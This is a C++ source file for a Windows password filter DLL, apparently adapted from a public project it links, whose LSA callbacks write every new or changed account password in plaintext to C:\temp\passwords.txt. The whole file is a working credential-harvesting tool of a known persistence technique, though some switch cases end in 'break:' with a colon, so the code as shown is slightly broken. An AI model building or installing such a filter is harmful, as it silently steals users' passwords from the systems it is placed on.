#include <windows.h>
#include <ntsecapi.h>  
#include <iostream>    
#include <fstream>     
#include <wchar.h>     
#define TEMP_FILE_PATH L"C:\\temp\\passwords.txt" 

/*
 sources : 
 https://learn.microsoft.com/fr-fr/windows/win32/dlls/dllmain
 https://github.com/3gstudent/PasswordFilter/blob/master/PasswordFilter/Win32Project3/dllmain.cpp
*/

BOOLEAN NTAPI InitializeChangeNotify(void) {
    return TRUE;
}

void LogPassword(const WCHAR* password) {
    std::wofstream file(TEMP_FILE_PATH, std::ios::app);
    
    if (file.is_open()) {
        file << password << std::endl;  
        file.close();  
    } else {
        std::wcerr <<"Error while openning Password File." << std::endl;
    }
}

NTSTATUS NTAPI PasswordFilter(PUNICODE_STRING Password, PUNICODE_STRING AccountName, PUNICODE_STRING DomainName, ULONG Operation) {
    
    LogPassword(Password->Buffer);
    return STATUS_SUCCESS;  
}

NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
    LogPassword(NewPassword->Buffer);
    return STATUS_SUCCESS;
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  
    DWORD fdwReason,     
    LPVOID lpvReserved )  
{
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break:
        case DLL_THREAD_DETACH:
            break:
        case DLL_PROCESS_DETACH:
            if (lpvReserved != nullptr)
            {
                break; 
            }
            break;
    }
    return TRUE;  
}
